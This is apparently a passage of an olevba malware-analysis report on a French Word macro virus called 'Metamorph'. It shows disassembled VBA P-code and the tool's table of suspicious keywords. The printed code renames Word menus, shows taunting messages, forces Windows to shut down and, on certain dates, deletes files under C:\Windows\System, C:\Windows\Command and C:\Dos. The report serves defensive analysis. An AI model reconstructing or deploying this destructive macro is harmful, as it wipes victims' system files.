' 	LitStr 0x0004 "File"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt Caption 
' Line #115:
' 	LitStr 0x000B "Enregistrer"
' 	LitDI2 0x0003 
' 	LitStr 0x0004 "File"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt Caption 
' Line #116:
' 	LitStr 0x0006 "Fermer"
' 	LitDI2 0x0004 
' 	LitStr 0x0004 "File"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt Caption 
' Line #117:
' 	LitStr 0x0017 "Aperçu avant impression"
' 	LitDI2 0x0008 
' 	LitStr 0x0004 "File"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt Caption 
' Line #118:
' 	LitStr 0x000C "Mise en page"
' 	LitDI2 0x0009 
' 	LitStr 0x0004 "File"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt Caption 
' Line #119:
' 	LitDI2 0x0001 
' 	Case 
' 	LitDI2 0x0003 
' 	Case 
' 	CaseDone 
' Line #120:
' 	LitStr 0x0006 "Copier"
' 	LitDI2 0x0003 
' 	LitStr 0x0004 "Edit"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt Caption 
' Line #121:
' 	LitStr 0x0006 "Coller"
' 	LitDI2 0x0004 
' 	LitStr 0x0004 "Edit"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt Caption 
' Line #122:
' 	LitStr 0x0006 "Couper"
' 	LitDI2 0x0005 
' 	LitStr 0x0004 "Edit"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt Caption 
' Line #123:
' 	LitStr 0x0011 "Selectionner tout"
' 	LitDI2 0x0008 
' 	LitStr 0x0004 "Edit"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt Caption 
' Line #124:
' 	LitStr 0x0007 "Effacer"
' 	LitDI2 0x0009 
' 	LitStr 0x0004 "Edit"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt Caption 
' Line #125:
' 	LitDI2 0x0006 
' 	Case 
' 	LitDI2 0x0009 
' 	Case 
' 	LitDI2 0x000A 
' 	Case 
' 	CaseDone 
' Line #126:
' 	LitStr 0x000F "Document maître"
' 	LitDI2 0x0001 
' 	LitStr 0x0004 "View"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt Caption 
' Line #127:
' 	LitStr 0x0004 "Plan"
' 	LitDI2 0x0002 
' 	LitStr 0x0004 "View"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt Caption 
' Line #128:
' 	LitStr 0x0011 "Lecture à l'écran"
' 	LitDI2 0x0003 
' 	LitStr 0x0004 "View"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt Caption 
' Line #129:
' 	LitStr 0x0004 "Page"
' 	LitDI2 0x0004 
' 	LitStr 0x0004 "View"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt Caption 
' Line #130:
' 	LitStr 0x0006 "Normal"
' 	LitDI2 0x0005 
' 	LitStr 0x0004 "View"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt Caption 
' Line #131:
' 	LitDI2 0x0005 
' 	Case 
' 	LitDI2 0x0007 
' 	Case 
' 	LitDI2 0x0008 
' 	Case 
' 	CaseDone 
' Line #132:
' 	LitStr 0x0013 "Puces et numéros..."
' 	LitDI2 0x0001 
' 	LitStr 0x0006 "Format"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt Caption 
' Line #133:
' 	LitStr 0x0009 "Police..."
' 	LitDI2 0x0002 
' 	LitStr 0x0006 "Format"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt Caption 
' Line #134:
' 	LitStr 0x0013 "Bordure et trame..."
' 	LitDI2 0x0003 
' 	LitStr 0x0006 "Format"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt Caption 
' Line #135:
' 	LitStr 0x000D "Paragraphe..."
' 	LitDI2 0x0004 
' 	LitStr 0x0006 "Format"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt Caption 
' Line #136:
' 	EndSelect 
' Line #137:
' 	Ld Date 
' 	St MyDate 
' Line #138:
' 	Ld Time 
' 	St MyTime 
' Line #139:
' 	Ld MyDate 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	St D$ 
' Line #140:
' 	Ld MyTime 
' 	LitDI2 0x0001 
' 	LitDI2 0x0005 
' 	ArgsLd Mid$ 0x0003 
' 	St T$ 
' Line #141:
' 	Ld MyTime 
' 	LitDI2 0x0001 
' 	LitDI2 0x0002 
' 	ArgsLd Mid$ 0x0003 
' 	St T1$ 
' Line #142:
' 	Ld MyTime 
' 	LitDI2 0x0004 
' 	LitDI2 0x0005 
' 	ArgsLd Mid$ 0x0003 
' 	St T2$ 
' Line #143:
' 	Ld D$ 
' 	LitStr 0x0001 "0"
' 	Eq 
' 	IfBlock 
' Line #144:
' 	LitStr 0x002D "Attention, j'ai contaminé votre ordinateur..."
' 	Ld vbCritical 
' 	LitStr 0x000F "Virus Metamorph"
' 	ArgsCall MsgBox 0x0003 
' Line #145:
' 	EndIfBlock 
' Line #146:
' 	Ld D$ 
' 	LitStr 0x0001 "1"
' 	Eq 
' 	IfBlock 
' Line #147:
' 	LitStr 0x0007 "Il est "
' 	Ld T$ 
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr$ 0x0001 
' 	Concat 
' 	LitStr 0x0014 "L'heure de metamorph"
' 	Concat 
' 	Ld vbInformation 
' 	LitStr 0x000F "Virus metamorph"
' 	ArgsCall MsgBox 0x0003 
' Line #148:
' 	EndIfBlock 
' Line #149:
' 	Ld D$ 
' 	Ld T1$ 
' 	Eq 
' 	IfBlock 
' Line #150:
' 	LitStr 0x000C "Au revoir..."
' 	Ld vbInformation 
' 	LitStr 0x000F "Virus Metamorph"
' 	ArgsCall MsgBox 0x0003 
' Line #151:
' 	Ld Tasks 
' 	ArgsMemCall ExitWindows 0x0000 
' Line #152:
' 	EndIfBlock 
' Line #153:
' 	Ld D$ 
' 	Ld T2$ 
' 	Eq 
' 	IfBlock 
' Line #154:
' 	LitStr 0x000E "Poufffff!!!!!!"
' 	Ld vbInformation 
' 	LitStr 0x000F "Virus Metamorph"
' 	ArgsCall MsgBox 0x0003 
' Line #155:
' 	LitStr 0x0015 "C:\Windows\System\*.*"
' 	ArgsCall Kill 0x0001 
' Line #156:
' 	LitStr 0x0016 "C:\Windows\Command\*.*"
' 	ArgsCall Kill 0x0001 
' Line #157:
' 	LitStr 0x0010 "C:\Windows\*.Com"
' 	ArgsCall Kill 0x0001 
' Line #158:
' 	LitStr 0x000A "C:\Dos\*.*"
' 	ArgsCall Kill 0x0001 
' Line #159:
' 	EndIfBlock 
' Line #160:
' 	Label ErrorAE 
' Line #161:
' 	EndSub 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Command             |May run PowerShell commands                  |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |Application.VBE     |Executable file name                         |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

